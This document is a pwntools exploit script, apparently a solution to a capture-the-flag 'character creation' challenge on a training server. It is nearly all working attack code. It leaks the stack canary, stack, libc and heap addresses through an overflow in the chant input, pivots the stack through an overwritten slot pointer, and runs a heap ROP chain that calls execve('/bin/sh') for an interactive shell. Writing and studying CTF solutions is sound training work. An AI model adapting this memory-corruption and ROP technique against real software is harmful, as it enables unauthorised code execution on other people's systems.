#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-character-creation-141a3b82047a.training.bksec.vn"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001947
            brva 0x0000000000001A62
            brva 0x0000000000001DEE
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def create(name=b'd1nhdwc', gd='male', age=19, cla=b'hacker', stat=0x40):
    sla(b' chars): ', name)
    if gd == 'male':
        sla(b'(Male/Female/Other): ', gd)
    else:
        sa(b'(Male/Female/Other): ', gd[:15])
    sla(b' age: ', str(age).encode())
    sla(b'character class: ', cla)
    sla(b'(Health): ', str(stat).encode())
    sla(b'(Magic Slots): ', str(stat).encode())
    sla(b'(Stamina): ', str(stat).encode())
    sla(b'Strength: ', str(stat).encode())
    sla(b'Dexterity: ', str(stat).encode())
    sla(b'Intelligence: ', str(stat).encode())
    sla(b'Faith: ', str(stat).encode())
    sla(b'Luck: ', str(stat).encode())

def choose_gift(opt):
    sla(b'): \x1B[0m', str(opt).encode())

def chant_len(len_):
    sla(b'chant length: ', str(len_).encode())
def chant_data(dt):
    sa(b'Chant: ', dt)


sla(b'Steam Account: ', b'douku')
sla(b'(yes/no):', b'yes')

# Canary + stack

create(stat=68)
chant_len(0x18)
chant_len(8)
chant_data(b'A'*8)
# GDB()
choose_gift(2)

p.recvuntil(b'A'*8 + b'\x0a')
canary = u64(b'\0' + p.recv(7))
log.success(f'canary: {hex(canary)}')
stack = u64(p.recv(6) + b'\0'*2)
log.success(f'stack: {hex(stack)}')

# Libc
sla(b'(yes/no):', b'yes')

create(stat=68)
chant_len(0x18)
chant_len(8)
# GDB()

libc_slot = stack + 0x8
pl = flat(
    b'B'*8,
    canary,
    libc_slot + 0x10
    )
chant_data(pl)
# GDB()
choose_gift(2)
p.recvuntil(b'Undead ')
libc.address = u64(p.recv(6) + b'\x00'*2) - 0x2a1ca
log.success(f'libc: {hex(libc.address)}')

# Overwrite Character_slots (stack pivot)

sla(b'(yes/no):', b'yes')

create(stat=68)
chant_len(0x18)

chant_len(8)

pl = flat(
    b'C'*8,
    canary,
    stack - 0x30
    )
# GDB()
chant_data(pl)
choose_gift(2)

def find_y_pointer():
    base = libc.address

    off = (0x79 - (base & 0xffff)) & 0xffff

    while off + 0x40 <= 0x27390:
        addr = base + off
        data = libc.read(addr, 0x40)

        pos = data.find(b'\x00')

        if pos != -1:
            valid = (
                (pos == 0 or data[pos - 1] != 0x0a)
                and b'\x0a' not in p64(addr)[:7]
            )

            if valid:
                assert p64(addr)[:2] == b'y\x00'
                return addr

        off += 0x10000

    raise ValueError("No suitable y-pointer; reconnect")

yptr = find_y_pointer()

log.success(f'y-pointer: {hex(yptr)}')  # b'y\x00...'

sa(b'(yes/no):', p64(yptr)[:7])

create(stat=68)
chant_len(0x18)
chant_len(8)

pl = flat(
    b'D'*8,
    canary,
    stack - 0x38
)

chant_data(pl)
choose_gift(2)

p.recvuntil(b'Undead ')
heap = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'heap: {hex(heap)}')

# Fake ROPchain on heap

sla(b'(yes/no):', b'yes')

pop_rdi = libc.address + 0x000000000010c08d
pop_rsi = libc.address + 0x0000000000110b7d

name = flat(
    0,
    0,
    canary,
    )

gender = flat(
    pop_rdi,
    next(libc.search(b'/bin/sh\0'))
    )

clss = flat(
    pop_rsi, 0,
    libc.sym.execve
    )
# GDB()

create(name=name, gd=gender, cla=clss, stat=68)

chant_len(0x18)
chant_len(8)
pl = flat(
    b'E'*8,
    canary,
    heap+0x20
)

chant_data(pl)
choose_gift(2)

# Stack pivot -> heap

sla(b'(yes/no):', b'no')

p.interactive()

# d1nhdwc